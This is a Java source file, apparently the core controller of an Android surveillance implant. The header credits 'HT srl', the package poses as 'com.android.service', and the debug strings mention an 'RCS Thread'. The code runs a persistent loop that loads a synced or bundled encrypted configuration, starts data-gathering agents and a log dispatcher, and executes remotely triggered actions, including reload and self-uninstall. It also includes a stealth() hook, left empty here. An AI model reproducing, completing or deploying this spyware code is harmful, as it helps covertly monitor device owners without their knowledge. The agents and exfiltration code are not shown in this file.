/* *********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 **********************************************/

package com.android.service;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.res.Resources;
import android.util.Log;

import com.android.service.action.Action;
import com.android.service.action.SubAction;
import com.android.service.action.UninstallAction;
import com.android.service.agent.AgentManager;
import com.android.service.auto.Cfg;
import com.android.service.conf.Configuration;
import com.android.service.event.EventManager;
import com.android.service.file.AutoFile;
import com.android.service.file.Path;
import com.android.service.util.Check;
import com.android.service.util.Utils;

/**
 * The Class Core, represents
 */
public class Core extends Activity implements Runnable {

	/** The Constant SLEEPING_TIME. */
	private static final int SLEEPING_TIME = 1000;
	private static final String TAG = "Core";

	/** The b stop core. */
	private boolean bStopCore = false;

	/** The resources. */
	private Resources resources;

	/** The core thread. */
	private Thread coreThread;

	/** The content resolver. */
	private ContentResolver contentResolver;

	/** The agent manager. */
	private AgentManager agentManager;

	/** The event manager. */
	private EventManager eventManager;

	/**
	 * Start.
	 * 
	 * @param r
	 *            the r
	 * @param cr
	 *            the cr
	 * @return true, if successful
	 */
	public boolean Start(final Resources r, final ContentResolver cr) {
		coreThread = new Thread(this);
		agentManager = AgentManager.self();
		eventManager = EventManager.self();

		resources = r;
		contentResolver = cr;

		Check.asserts(resources != null, "Null Resources");

		try {
			coreThread.start();
		} catch (Exception e) {
			if(Cfg.DEBUG) { e.printStackTrace(); }
		}
		
		return true;
	}

	/**
	 * Stop.
	 * 
	 * @return true, if successful
	 */
	public boolean Stop() {
		bStopCore = true;
		stopAll();
		if(Cfg.DEBUG) Log.d("QZ", TAG + " RCS Thread Stopped");
		return true;
	}

	// Runnable (main routine for RCS)
	/*
	 * (non-Javadoc)
	 * 
	 * @see java.lang.Runnable#run()
	 */
	public void run() {
		if(Cfg.DEBUG) Log.d("QZ", TAG + " RCS Thread Started");
		
		stealth();
		
		try {
			while (!bStopCore) {
				if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: init task");

				if (taskInit() == false) {
					if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: TaskInit() FAILED");
					break;
				} else {
					if(Cfg.DEBUG) Log.d("QZ", TAG + " TaskInit() OK");
					// CHECK: Status o init?
				}

				Status.self().setRestarting(false);
				if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: starting checking actions");

				if (checkActions() == Exit.RELOAD) {
					if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: Waiting a while before reloading");
					Utils.sleep(2000);
				} else {
					if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: CheckActions() wants to exit");
					// chiudere tutti i thread
					break;
				}
			}
			stopAll();
		} catch (final Exception ex) {
			if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: run " + ex);
		} finally {
			if(Cfg.DEBUG) Log.d("QZ", TAG + " AndroidService exit ");
			Utils.sleep(1000);
			
			System.runFinalizersOnExit(true);
			finish();
			//System.exit(0);
		}
	}

	private void stopAll() {
		Status status = Status.self();
		status.setRestarting(true);
		if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: " + "checkActions: reloading");
		status.unTriggerAll();
		if(Cfg.DEBUG) Log.d("QZ", TAG + " checkActions: stopping agents");
		agentManager.stopAll();
		if(Cfg.DEBUG) Log.d("QZ", TAG + " checkActions: stopping events");
		eventManager.stopAll();
		Utils.sleep(2000);
		if(Cfg.DEBUG) Log.d("QZ", TAG + " checkActions: untrigger all");
		status.unTriggerAll();

		final LogDispatcher logDispatcher = LogDispatcher.self();
		if (!logDispatcher.isAlive()) {
			logDispatcher.halt();
		}
	}

	/**
	 * Verifica le presenza di azioni triggered. Nel qual caso le esegue in modo
	 * bloccante.
	 * 
	 * @return true, if successful
	 */
	private Exit checkActions() {
		final Status status = Status.self();

		try {
			while (!bStopCore) {
				if(Cfg.DEBUG) Log.d("QZ", TAG + " checkActions");
				final int[] actionIds = status.getTriggeredActions();

				for (int actionId : actionIds) {
					final Action action = status.getAction(actionId);
					final Exit exitValue = executeAction(action);

					if (exitValue == Exit.UNINSTALL) {
						if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: checkActions: Uninstall");
						UninstallAction.actualExecute();

						return exitValue;
					} else if (exitValue == Exit.RELOAD) {
						if(Cfg.DEBUG) Log.d("QZ", TAG + " checkActions: want Reload");

						return exitValue;
					}
				}
			}

			return Exit.STOP;
		} catch (final Throwable ex) {
			// catching trowable should break the debugger ans log the full
			// stack trace
			if(Cfg.DEBUG) Log.d("QZ", TAG + " FATAL: checkActions error, restart: " + ex);

			return Exit.ERROR;
		}
	}

	/**
	 * Inizializza il core.
	 * 
	 * @return false if any fatal error
	 */
	private boolean taskInit() {
		try {
			Path.makeDirs();

			// Identify the device uniquely
			final Device device = Device.self();

			if (!loadConf()) {
				if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: Cannot load conf");
				return false;
			}

			// Start log dispatcher
			final LogDispatcher logDispatcher = LogDispatcher.self();
			if (!logDispatcher.isAlive()) {
				logDispatcher.start();
			}

			// Da qui in poi inizia la concorrenza dei thread
			if (eventManager.startAll() == false) {
				if(Cfg.DEBUG) Log.d("QZ", TAG + " eventManager FAILED");
				return false;
			}

			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: Events started");

			if (agentManager.startAll() == false) {
				if(Cfg.DEBUG) Log.d("QZ", TAG + " agentManager FAILED");
				return false;
			}
		
			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: Agents started");
			if(Cfg.DEBUG) Log.d("QZ", TAG + " Core initialized");
			return true;

		} catch (final GeneralException rcse) {
			if(Cfg.DEBUG) { rcse.printStackTrace(); }
			if(Cfg.DEBUG) Log.d("QZ", TAG + " RCSException() detected");
		} catch (final Exception e) {
			if(Cfg.DEBUG) { e.printStackTrace(); }
			if(Cfg.DEBUG) Log.d("QZ", TAG + " Exception() detected");
		}

		return false;

	}

	/**
	 * Tries to load the new configuration, if it fails it get the resource
	 * conf.
	 * 
	 * @return false if no correct conf available
	 * @throws GeneralException
	 *             the rCS exception
	 */
	public boolean loadConf() throws GeneralException {
		boolean loaded = false;

		// tries to load the file got from the sync, if any.
		final AutoFile file = new AutoFile(Path.conf() + Configuration.NEW_CONF);

		if (file.exists()) {
			final byte[] resource = file.read(8);

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);

			// Load the configuration
			loaded = conf.LoadConfiguration();

			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: Conf file loaded: " + loaded);

			if (!loaded) {
				file.delete();
			}
		}

		// tries to load the resource conf
		if (!loaded) {
			// Open conf from resources and load it into resource
			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 8); // config.bin

			// Initialize the configuration object
			final Configuration conf = new Configuration(resource);

			// Load the configuration
			loaded = conf.LoadConfiguration();

			if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: Resource file loaded: " + loaded);
		}

		return loaded;
	}

	/**
	 * Stealth.
	 */
	private void stealth() {
		// TODO Auto-generated method stub
	}

	/**
	 * Execute action.
	 * (Questa non viene decompilata correttamente.)
	 * @param action
	 *            the action
	 * @return the int
	 */
	private Exit executeAction(final Action action) {
		Exit exit = Exit.SUCCESS;

		if(Cfg.DEBUG) Log.d("QZ", TAG + " CheckActions() triggered: " + action);
		final Status status = Status.self();
		status.unTriggerAction(action);

		status.synced = false;

		final int ssize = action.getSubActionsNum();
		if(Cfg.DEBUG) Log.d("QZ", TAG + " checkActions, " + ssize + " subactions");

		int i = 1;
		for( SubAction subAction : action.getSubActions()){
			try {

				/*
				 * final boolean ret = subAction.execute(action
				 * .getTriggeringEvent());
				 */
				if(Cfg.DEBUG) Log.d("QZ", TAG + " Info: (CheckActions) executing subaction (" + (i++) + "/" + ssize + ") : "
						+ action);

				subAction.prepareExecute();
				boolean ret = subAction.execute();

				if (status.uninstall) {
					if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: (CheckActions): uninstalling");
					
					UninstallAction.actualExecute();
					
					exit = Exit.UNINSTALL;
					break;

				}

				if (status.reload) {
					if(Cfg.DEBUG) Log.d("QZ", TAG + " (CheckActions): reloading");
					stopAll();

					exit = Exit.RELOAD;
					status.reload = false;
					break;
				}

				if (ret == false) {
					if(Cfg.DEBUG) Log.d("QZ", TAG + " Warn: " + "CheckActions() error executing: " + subAction);
					continue;
				}
			} catch (final Exception ex) {
				if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: checkActions for: " + ex);
			}
		}

		return exit;
	}

}